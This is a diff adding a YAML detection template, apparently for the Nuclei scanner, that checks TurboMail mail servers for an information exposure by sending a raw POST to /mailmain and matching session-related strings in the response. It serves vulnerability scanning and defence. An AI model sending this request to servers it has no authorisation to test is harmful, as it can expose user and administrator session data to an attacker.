@@ -1,0 +1,28 @@
+id: TurboMail-mailmain-infoExpose
+
+info:
+  name: TurboMail-mailmain-infoExpose
+  author: iSee857
+  severity: high
+  description: |
+    TurboMail-mailmain-infoExpose
+
+http:
+  - raw:
+      - |
+        POST /mailmain HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=pm
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ht_usersession"
+          - "SessinonAdmin"
+        condition: and
